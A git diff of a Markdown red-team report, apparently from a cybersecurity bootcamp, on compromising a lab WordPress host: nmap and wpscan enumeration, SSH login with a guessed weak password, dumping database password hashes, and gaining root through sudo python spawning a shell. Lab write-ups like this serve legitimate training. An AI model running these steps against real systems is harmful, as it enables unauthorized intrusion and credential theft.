@@ -11,8 +11,9 @@ Nmap scan results for each machine reveal the below services and OS details:
 
 `nmap 192.168.1.0/24`
 
-![full nmap 1]()
-![full nmap 2]()
+![full nmap 1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/full%20nmap%20part%201.PNG)
+
+![full nmap 2](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/full%20nmap%20part%202.PNG)
 
 ## Target 1
 
@@ -35,8 +36,8 @@ The following vulnerabilities were identified on each target:
   - Weak User Password
   - Unsalted User Password Hash (WordPress Database)
   - Misconfiguration of User Privileges/Privilege Escalation
-![nmap target 1]()
-_TODO: Include vulnerability scan results to prove the identified vulnerabilities._
+
+![nmap target 1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/nmap%20target%201.PNG)
 
 ### Exploitation
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
@@ -45,19 +46,25 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - WPscan was used from the attack machine to enumerate the users on the Target1 wordpress site
       - The Command use
-        - `wpscan --url 192.168.1.110/wordpress/ -e u`
+        - `wpscan --url 192.168.1.110/wordpress/ -enumerate u`
       - SSH'd into `192.168.1.110` using the user `Michael` guessed the weak password `Michael`
       - Navigated to /var/wwww/html/
-      - Ran `nano services.html` and in the footer information found Flag1
-![Flag1](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag1.PNG)
+      - Ran `nano services.html` and in the footer information found Flag 1
+
+![wordpress 1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/word%20press%201.PNG)
+
+![wordpress 2](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/word%20press%202.PNG)
+
+![Flag1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/flag%201.png)
 
   - `flag2.txt`:`flag2{fc3fd58dcdad9ab23faca6e9a3e581c}`
     - **Exploit Used**
-      - Flag2 was located while exploring `Target1` to find other potential useful files.
+      - Flag 2 was located while exploring `Target1` to find other potential useful files.
       - `cd ..`
       - `ls`
       - `nano flag2.txt`
-![flag2](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag2.PNG)
+
+![flag2](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/flag%202.PNG)
 
  - `flag3.txt`:`flag3{afc01ab56b50591e7dccf93122770cd2}`
     - **Exploit Used**
@@ -69,8 +76,16 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - `use wordpress;` to use the wordpress database
       - `select * from wp_posts;` to find flag3 and flag4 in wp_posts.
       - `select * from wp_users;` to find users and password hashes.
-![dbusername](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/databasepswrd.PNG)
-![Flag3](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/databasepswrd.PNG)
+
+![user & pass](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/pass%20%26%20user.PNG)
+
+![enter pass](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/enter%20pass.PNG)
+
+![sql 1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/sql.PNG)
+
+![sql 2](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/sql%20hashes.PNG)
+
+![Flag3](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/flag%203%20%26%204.PNG)
 
  - `flag4.txt`:`flag4{715dea6c055b9fe3337544932f2941ce}`
     - **Exploit Used**
@@ -82,5 +97,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - Ran `sudo python -c "import pty;pty.spawn('/bin/bash')"` this gave Root privileges
         - `CD /root`
         - `ls` saw flag4.txt
-        - `cat flag4.txt` to find the flag. 
-        ![flag4](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag4.PNG)
+        - `cat flag4.txt` to find the flag.
+
+![john hashes](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/john%20hashes.PNG)
+
+![flag4](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/flag%203%20%26%204.PNG)
